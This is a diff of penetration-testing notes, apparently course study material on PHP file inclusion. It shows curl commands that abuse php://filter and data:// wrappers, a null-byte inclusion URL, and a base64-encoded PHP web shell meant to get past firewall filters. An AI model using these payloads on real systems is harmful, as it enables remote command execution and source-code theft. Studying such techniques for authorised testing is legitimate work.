@@ -25,16 +25,14 @@ http://www.bostonwebgroup.com/script.php?file=shell.php%00.dat
 ```
 
 ### PHP wrappers
+>When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.
 ```
 curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
 curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
 
-When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.
-
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64 (PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==)
 
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
-
-we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include7 setting needs to be enabled
 ```
+>we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include7 setting needs to be enabled
